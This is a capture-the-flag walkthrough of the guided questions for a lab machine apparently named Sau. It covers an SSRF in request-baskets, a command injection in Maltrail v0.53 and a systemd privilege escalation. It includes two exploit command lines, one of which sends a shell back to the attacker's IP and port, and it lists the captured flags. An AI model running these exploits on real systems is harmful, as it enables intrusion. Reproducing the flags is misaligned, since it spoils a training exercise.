## Guided:
**Q:** Which is the highest open TCP port on the target machine?<br>
**A:** 55555

**Q:** What is the name of the open source software that the application on 55555 is "powered by"?<br>
**A:** request-baskets<br>
> (can be seen at the bottom of the web-page on port 55555)

**Q:** What is the version of request-baskets running on Sau?<br>
**A:** 1.2.1

**Q:** What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?<br>
**A:** CVE-2023-27163 <br>
> [CVE-2023-27163](https://sploitus.com/exploit?id=6BAA524E-16EA-562C-804B-113B8244C6EA)<br>
> `./CVE-2023-27163.sh -t http://<Target-IP>:55555 -a http://127.0.0.1:80`
 

**Q:** What is the name of the software that the application running on port 80 is "powered by"?<br>
**A:** Maltrail       (v.0.53)

**Q:** There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path targeted by this exploit?<br>
**A:** /login<br>
> [Hint](https://github.com/spookier/Maltrail-v0.53-Exploit)<br>
> `python3 exploit.py <my-ip> <my-port> http://10.129.229.26:55555/aiwqmw`

**Q:** What user is the Mailtrack application running as on Sau?<br>
**A:** Puma

**Q:** Submit the flag located in the puma user's home directory.<br>
**A:** 6e1deb15f20758d7a87c185c5ceafba0

**Q:** What is the full path to the application the user puma can run as root on Sau?<br>
**A:** /usr/bin/systemctl

**Q:** What is the full version string for the instance of systemd installed on Sau?<br>
**A:** systemd 245 (245.4-4ubuntu3.22)
> `systemd --version` |or| `systemctl --version`

**Q:** What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?<br>
**A:** CVE-2023-26604 <br>
> Note: Found this [gem](https://packetstormsecurity.com/files/174130/systemd-246-Local-Root-Privilege-Escalation.html)

**Q:** Submit the flag located in the root user's home directory.<br>
**A:** f71ed79c4dc47ebebb5a63c2a2b2e31e

